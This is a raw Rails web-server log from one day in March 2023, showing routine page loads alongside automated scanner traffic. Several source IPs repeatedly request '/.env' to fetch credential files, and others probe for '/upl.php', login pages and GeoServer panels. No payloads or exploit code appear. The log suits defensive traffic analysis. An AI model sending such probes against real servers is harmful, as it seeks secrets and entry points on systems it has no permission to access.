I, [2023-03-12T14:03:16.423153 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T14:03:16.423880 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T14:03:16.424067 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T14:17:51.641668 #2360580]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-03-12 14:17:51 +0900
F, [2023-03-12T14:17:51.642020 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T14:17:52.161234 #2360582]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-03-12 14:17:52 +0900
I, [2023-03-12T14:17:52.161842 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T14:17:52.161879 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T14:17:52.162329 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T14:17:52.162946 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T14:17:52.163121 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T14:20:51.962056 #2360580]  INFO -- : Started GET "/" for 45.187.12.25 at 2023-03-12 14:20:51 +0900
I, [2023-03-12T14:20:51.963103 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T14:20:51.964211 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-03-12T14:20:51.965079 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-12T14:20:51.965314 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 513)
I, [2023-03-12T14:23:18.439587 #2360582]  INFO -- : Started GET "/v3/time" for 104.192.0.50 at 2023-03-12 14:23:18 +0900
I, [2023-03-12T14:23:18.440207 #2360582]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T14:23:18.440251 #2360582]  INFO -- :   Parameters: {"all"=>"v3/time"}
I, [2023-03-12T14:23:18.440675 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T14:23:18.441503 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T14:23:18.441680 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 512)
I, [2023-03-12T14:52:04.545375 #2360580]  INFO -- : Started GET "/" for 128.1.248.26 at 2023-03-12 14:52:04 +0900
I, [2023-03-12T14:52:04.546322 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T14:52:04.546798 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T14:52:04.547603 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T14:52:04.547978 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-12T15:06:22.175732 #2360582]  INFO -- : Started GET "/" for 157.245.130.124 at 2023-03-12 15:06:22 +0900
I, [2023-03-12T15:06:22.176407 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T15:06:22.177244 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T15:06:22.178792 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-03-12T15:06:22.178989 #2360582]  INFO -- : Completed 200 OK in 3ms (Views: 2.1ms | Allocations: 521)
I, [2023-03-12T15:06:22.499409 #2360580]  INFO -- : Started GET "/client/get_targets" for 157.245.130.124 at 2023-03-12 15:06:22 +0900
I, [2023-03-12T15:06:22.500360 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T15:06:22.500476 #2360580]  INFO -- :   Parameters: {"all"=>"client/get_targets"}
I, [2023-03-12T15:06:22.501300 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T15:06:22.501953 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T15:06:22.502133 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T15:06:22.866313 #2360582]  INFO -- : Started GET "/upl.php" for 157.245.130.124 at 2023-03-12 15:06:22 +0900
I, [2023-03-12T15:06:22.866913 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T15:06:22.867079 #2360582]  INFO -- :   Parameters: {"all"=>"upl"}
I, [2023-03-12T15:06:22.867605 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T15:06:22.868601 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 298)
I, [2023-03-12T15:06:22.868768 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 507)
I, [2023-03-12T15:08:24.589477 #2360582]  INFO -- : Started GET "/" for 43.128.225.197 at 2023-03-12 15:08:24 +0900
I, [2023-03-12T15:08:24.590350 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T15:08:24.590863 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T15:08:24.591705 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T15:08:24.591948 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T15:19:03.736028 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 15:19:03 +0900
I, [2023-03-12T15:19:03.736789 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T15:19:03.736840 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T15:19:03.737537 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T15:19:03.738452 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-12T15:19:03.738623 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 505)
I, [2023-03-12T16:36:31.677064 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 16:36:31 +0900
I, [2023-03-12T16:36:31.677791 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T16:36:31.677834 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T16:36:31.678262 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T16:36:31.678880 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T16:36:31.679028 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 506)
I, [2023-03-12T16:56:18.086860 #2360580]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-03-12 16:56:18 +0900
I, [2023-03-12T16:56:18.087499 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T16:56:18.087539 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T16:56:18.087978 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T16:56:18.088614 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T16:56:18.089206 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T16:56:18.620299 #2360580]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-03-12 16:56:18 +0900
F, [2023-03-12T16:56:18.620752 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T17:02:56.006039 #2360580]  INFO -- : Started GET "/" for 64.227.64.134 at 2023-03-12 17:02:56 +0900
I, [2023-03-12T17:02:56.006651 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T17:02:56.007099 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T17:02:56.012545 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 5.5ms | Allocations: 299)
I, [2023-03-12T17:02:56.017198 #2360580]  INFO -- : Completed 200 OK in 10ms (Views: 10.1ms | Allocations: 513)
I, [2023-03-12T17:48:55.502400 #2360582]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-03-12 17:48:55 +0900
I, [2023-03-12T17:48:55.503454 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T17:48:55.503506 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T17:48:55.504195 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T17:48:55.504822 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T17:48:55.505018 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T17:48:56.053701 #2360580]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-03-12 17:48:56 +0900
F, [2023-03-12T17:48:56.054036 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T17:54:01.003993 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 17:54:01 +0900
I, [2023-03-12T17:54:01.004597 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T17:54:01.004637 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T17:54:01.006160 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T17:54:01.007455 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-03-12T17:54:01.007644 #2360582]  INFO -- : Completed 200 OK in 3ms (Views: 2.7ms | Allocations: 505)
I, [2023-03-12T18:05:45.945231 #2360580]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-12 18:05:45 +0900
I, [2023-03-12T18:05:45.945850 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T18:05:45.945891 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T18:05:45.946312 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T18:05:45.947066 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T18:05:45.947248 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T18:05:46.517428 #2360582]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-12 18:05:46 +0900
F, [2023-03-12T18:05:46.517774 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T18:39:56.003494 #2360580]  INFO -- : Started GET "/.env" for 13.84.202.16 at 2023-03-12 18:39:56 +0900
I, [2023-03-12T18:39:56.004223 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T18:39:56.004282 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T18:39:56.004749 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T18:39:56.008105 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.4ms | Allocations: 299)
I, [2023-03-12T18:39:56.009544 #2360580]  INFO -- : Completed 200 OK in 5ms (Views: 3.8ms | Allocations: 521)
I, [2023-03-12T18:39:56.279801 #2360582]  INFO -- : Started POST "/" for 13.84.202.16 at 2023-03-12 18:39:56 +0900
F, [2023-03-12T18:39:56.280155 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T19:11:43.710361 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 19:11:43 +0900
I, [2023-03-12T19:11:43.716100 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T19:11:43.716175 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T19:11:43.718076 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T19:11:43.720531 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.6ms | Allocations: 299)
I, [2023-03-12T19:11:43.720999 #2360580]  INFO -- : Completed 200 OK in 5ms (Views: 3.9ms | Allocations: 506)
I, [2023-03-12T20:22:18.686631 #2360582]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-03-12 20:22:18 +0900
I, [2023-03-12T20:22:18.687320 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T20:22:18.687368 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T20:22:18.687803 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T20:22:18.688457 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T20:22:18.688629 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T20:22:19.221557 #2360580]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-03-12 20:22:19 +0900
F, [2023-03-12T20:22:19.221898 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T20:29:27.435341 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 20:29:27 +0900
I, [2023-03-12T20:29:27.435956 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T20:29:27.436000 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T20:29:27.436423 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T20:29:27.437423 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-12T20:29:27.437580 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 505)
I, [2023-03-12T20:40:07.977003 #2360580]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-12 20:40:07 +0900
I, [2023-03-12T20:40:07.978209 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T20:40:07.978262 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T20:40:07.978875 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T20:40:07.980108 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-03-12T20:40:07.980408 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 521)
I, [2023-03-12T20:40:08.531561 #2360580]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-12 20:40:08 +0900
F, [2023-03-12T20:40:08.531903 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T21:40:47.697335 #2360582]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-12 21:40:47 +0900
I, [2023-03-12T21:40:47.698024 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T21:40:47.698479 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T21:40:47.699521 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-03-12T21:40:47.699857 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-12T21:44:13.714382 #2360580]  INFO -- : Started GET "/" for 188.94.33.58 at 2023-03-12 21:44:13 +0900
I, [2023-03-12T21:44:13.714978 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T21:44:13.715656 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T21:44:13.716462 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T21:44:13.716811 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 513)
I, [2023-03-12T21:47:14.336304 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 21:47:14 +0900
I, [2023-03-12T21:47:14.337201 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T21:47:14.337262 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T21:47:14.337803 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T21:47:14.338514 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T21:47:14.338662 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-03-12T22:09:04.353146 #2360580]  INFO -- : Started GET "/.env" for 3.69.255.254 at 2023-03-12 22:09:04 +0900
I, [2023-03-12T22:09:04.353787 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T22:09:04.353829 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T22:09:04.354254 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T22:09:04.354969 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T22:09:04.355153 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T22:09:05.034883 #2360582]  INFO -- : Started POST "/" for 3.69.255.254 at 2023-03-12 22:09:05 +0900
F, [2023-03-12T22:09:05.035220 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T22:21:49.317330 #2360580]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-03-12 22:21:49 +0900
I, [2023-03-12T22:21:49.318259 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T22:21:49.318311 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T22:21:49.318828 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T22:21:49.320734 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.9ms | Allocations: 299)
I, [2023-03-12T22:21:49.320964 #2360580]  INFO -- : Completed 200 OK in 3ms (Views: 2.3ms | Allocations: 521)
I, [2023-03-12T22:21:49.853513 #2360582]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-03-12 22:21:49 +0900
F, [2023-03-12T22:21:49.853909 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T22:27:29.097211 #2360580]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-12 22:27:29 +0900
I, [2023-03-12T22:27:29.097847 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T22:27:29.097885 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T22:27:29.098310 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T22:27:29.098923 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T22:27:29.099096 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 521)
I, [2023-03-12T22:27:29.665413 #2360580]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-12 22:27:29 +0900
F, [2023-03-12T22:27:29.665762 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T22:27:35.519811 #2360580]  INFO -- : Started GET "/" for 64.62.197.69 at 2023-03-12 22:27:35 +0900
I, [2023-03-12T22:27:35.520415 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T22:27:35.521152 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T22:27:35.521969 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-03-12T22:27:35.522148 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 515)
I, [2023-03-12T22:33:10.859848 #2360580]  INFO -- : Started GET "/geoserver/web/" for 64.62.197.65 at 2023-03-12 22:33:10 +0900
I, [2023-03-12T22:33:10.860650 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T22:33:10.860709 #2360580]  INFO -- :   Parameters: {"all"=>"geoserver/web"}
I, [2023-03-12T22:33:10.861198 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T22:33:10.861959 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T22:33:10.862136 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T22:36:32.956267 #2360582]  INFO -- : Started GET "/login/login.php" for 94.102.51.9 at 2023-03-12 22:36:32 +0900
I, [2023-03-12T22:36:32.957869 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T22:36:32.957922 #2360582]  INFO -- :   Parameters: {"all"=>"login/login"}
I, [2023-03-12T22:36:32.959136 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.8ms | Allocations: 4)
I, [2023-03-12T22:36:32.961424 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.1ms | Allocations: 299)
I, [2023-03-12T22:36:32.961594 #2360582]  INFO -- : Completed 200 OK in 4ms (Views: 3.4ms | Allocations: 514)
I, [2023-03-12T23:01:19.196567 #2360582]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-03-12 23:01:19 +0900
I, [2023-03-12T23:01:19.197253 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T23:01:19.197300 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T23:01:19.197731 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T23:01:19.198629 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T23:01:19.198819 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-12T23:01:19.733387 #2360580]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-03-12 23:01:19 +0900
F, [2023-03-12T23:01:19.733945 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T23:05:26.051824 #2360582]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 23:05:26 +0900
I, [2023-03-12T23:05:26.052442 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T23:05:26.052489 #2360582]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T23:05:26.053131 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T23:05:26.053778 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T23:05:26.053934 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 505)
I, [2023-03-12T23:52:03.744464 #2360580]  INFO -- : Started GET "/" for 188.255.247.205 at 2023-03-12 23:52:03 +0900
I, [2023-03-12T23:52:03.745337 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T23:52:03.745772 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T23:52:03.746609 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T23:52:03.746777 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
